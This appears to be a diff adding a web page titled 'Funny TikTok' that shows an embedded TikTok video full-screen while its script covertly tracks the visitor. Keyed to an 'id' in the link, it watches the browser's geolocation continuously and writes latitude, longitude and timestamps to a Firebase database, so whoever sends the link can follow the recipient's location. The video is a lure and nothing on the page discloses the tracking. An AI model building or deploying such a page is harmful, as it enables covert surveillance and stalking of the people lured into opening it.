@@ -1,0 +1,50 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Funny TikTok</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    html, body { margin: 0; padding: 0; height: 100%; background: black; overflow: hidden; }
+    #video-container { width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; }
+    iframe { width: 100%; height: 100%; border: none; }
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+</head>
+<body>
+  <div id="video-container">
+    <!-- Embed TikTok video (bisa diganti dengan video lain) -->
+    <iframe src="https://www.tiktok.com/embed/7087486793632812294" allowfullscreen></iframe>
+  </div>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "your-api-key",
+      authDomain: "your-auth-domain",
+      databaseURL: "your-db-url",
+      projectId: "your-project-id",
+      storageBucket: "your-storage-bucket",
+      messagingSenderId: "your-msg-id",
+      appId: "your-app-id"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const params = new URLSearchParams(window.location.search);
+    const trackedId = params.get("id");
+
+    if (trackedId && navigator.geolocation) {
+      navigator.geolocation.watchPosition((position) => {
+        const locationRef = db.ref("locations/" + trackedId);
+        locationRef.set({
+          lat: position.coords.latitude,
+          lng: position.coords.longitude,
+          timestamp: Date.now()
+        });
+      });
+    }
+  </script>
+</body>
+</html>
